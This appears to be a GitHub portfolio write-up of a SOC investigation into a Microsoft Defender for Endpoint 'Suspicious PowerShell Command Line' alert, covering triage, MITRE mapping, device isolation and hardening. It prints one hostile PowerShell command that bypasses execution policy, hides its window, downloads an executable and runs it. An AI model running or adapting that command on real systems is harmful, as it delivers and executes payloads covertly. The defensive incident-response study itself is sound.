
🛡️ Project Overview
This project focuses on a Suspicious PowerShell Command Line alert. The scenario involves an attacker attempting to bypass execution policies and download a secondary payload (invoice.exe) while remaining hidden from the end-user.

By documenting this incident, I showcase my ability to navigate the Defender for Endpoint portal, interpret the Attack Story, and perform critical remediation actions like device isolation and automated investigations.

🕵️ The Incident: Suspicious PowerShell Execution
Alert Trigger: Suspicious PowerShell Command Line The Malicious Command:

PowerShell
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden -Command { $ErrorActionPreference = 'SilentlyContinue'; (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\test-WDATP-test\invoice.exe'); Start-Process 'C:\test-WDATP-test\invoice.exe' }


# 🚨 Suspicious PowerShell Command Line Investigation (Microsoft Defender for Endpoint)

## 🛡️📌 Project Overview

This GitHub project documents a **realistic SOC-style incident investigation** based on a **Microsoft Defender for Endpoint alert** triggered by a **Suspicious PowerShell Command Line execution**.

The project demonstrates how a **Security Analyst** investigates, responds to, and remediates a potentially malicious PowerShell-based attack leveraging **execution policy bypass**, **hidden windows**, and **in-memory payload delivery** — a common attacker technique.

This repository is designed for:

- SOC Analysts (L1–L2)
- Blue Team practitioners
- Cybersecurity portfolio demonstrations
- Interview & hands-on learning scenarios

---

## 🛑 Alert Summary

<img width="468" height="107" alt="image" src="https://github.com/user-attachments/assets/345dfff3-6bf8-4e6a-914e-fea27a6c0ec3" />


| Field        | Value                              |
| ------------ | ---------------------------------- |
| Alert Name   | Suspicious PowerShell Command Line |
| Platform     | Microsoft Defender for Endpoint    |
| Severity     | High                               |
| Technique    | Living-off-the-Land (PowerShell)   |
| MITRE ATT&CK | T1059.001 – PowerShell             |
| Category     | Execution / Defense Evasion        |

---

## 📝 Incident Description

A suspicious PowerShell activity was detected on an endpoint. The observed command attempted to:

- Bypass PowerShell execution policy  
- Run in a hidden window  
- Download an external executable  
- Execute the payload immediately  

Such behavior is commonly associated with:

- Initial access payload execution  
- Malware installation  
- Lateral movement staging  
- Fileless attack techniques  

Attackers frequently abuse PowerShell to execute payloads **directly in memory**, avoiding disk-based detection.

---


## 🚩 Why This Is Suspicious

- **ExecutionPolicy Bypass** → Disables PowerShell security controls and allows scripts to run unrestricted  
- **WindowStyle Hidden** → Conceals execution from the end user  
- **WebClient.DownloadFile** → Common malware delivery technique used to fetch payloads  
- **Immediate execution of downloaded file** → Indicates automated malware deployment  

---

## 📖 Attack Story (Defender Timeline)

    <img width="468" height="228" align="centre" alt="image" src="https://github.com/user-attachments/assets/7382e5af-09be-46f5-a74f-92c6847651b6" />

The **Attack Story** in Microsoft Defender for Endpoint revealed the following sequence:

- PowerShell launched with obfuscation and execution policy bypass flags  
- Network connection attempt to retrieve an executable payload  
- Payload written to disk using a misleading filename (`invoice.exe`)  
- Immediate execution of the downloaded payload  

---

## 🛠️ Incident Response Actions

### 1️⃣ Identify the Classification

- **Confirmed Threat**  
- **Malware Delivery via PowerShell**  
- High-confidence Indicator of Compromise (IOC)  

---

### 2️⃣ Isolate the Device

- Endpoint isolated using **Microsoft Defender for Endpoint**  
- Prevented further lateral movement and command-and-control (C2) communication  

---

### 3️⃣ Initiate Automated Investigation

- Triggered **Automated Investigation and Response (AIR)**  
- Reviewed investigation graph, evidence, and system verdicts  

---

### 4️⃣ Run Full Antivirus Scan

- Full antivirus scan initiated  
- Malicious artifacts detected and quarantined  

---

### 5️⃣ Forensic Investigation – *The “Why”*

Before closing the alert, the following forensic checks were performed:

#### 🔗 Parent Process Analysis

Investigated what launched PowerShell:

- Web browser download  
- Outlook email attachment  
- Remote administration or scripting tool  

---

#### 🌐 Network Activity Review

- Command referenced `127.0.0.1`  
- In real-world investigations, analysts validate:
  - External IP addresses  
  - Suspicious domains  
  - Proxy or loopback abuse  

---

#### 🧾 Command Line Content

- Presence of **Bypass** and **Hidden** flags  
- Strong indicator of attacker tradecraft  
- Rarely observed in legitimate enterprise automation  

---

## 🧠 MITRE ATT&CK Mapping

| Tactic            | Technique                     |
|------------------|-------------------------------|
| Execution         | T1059.001 – PowerShell        |
| Defense Evasion   | T1562 – Impair Defenses       |
| Command & Control | T1105 – Ingress Tool Transfer |

---

## 🔐 Remediation & Hardening

- Blocked malicious hash and command-line pattern  
- Enabled **PowerShell Constrained Language Mode** (where applicable)  
- Strengthened **Defender Attack Surface Reduction (ASR) rules**  
- Reviewed PowerShell usage across all endpoints  
- Conducted user awareness and security hygiene follow-up  



Skills Demonstrated: Incident Response | Microsoft Defender for Endpoint | PowerShell Forensics | Threat Hunting | SOC Operations
